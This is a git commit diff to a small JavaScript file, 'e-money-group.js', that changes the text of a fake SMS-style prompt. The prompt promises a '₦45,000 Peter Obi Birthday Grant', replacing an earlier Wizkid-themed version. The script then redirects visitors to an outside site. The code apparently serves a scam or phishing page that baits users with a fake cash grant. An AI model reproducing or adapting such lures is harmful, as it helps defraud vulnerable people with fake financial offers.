ef4dea2df05878ee420699a2c58e98210867b0dd
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-07-19 00:14:28 -0700

    Update e-money-group.js

--- e-money-group.js
+++ e-money-group.js
@@ -1,6 +1,6 @@
 
 var password = '1'
-password=prompt('SMS: Congratulations you have been selected to receive ₦35,000 Wizkidayo Birthday Grant, Kindly press 1 to open grant form ','1');
+password=prompt('SMS: Congratulations you have been selected to receive ₦45,000 Peter Obi Birthday Grant, Kindly press 1 to open grant form ','1');
 if (password != '1') {
 location.href='https://2024-program.xyz/wizkid.html';
 }
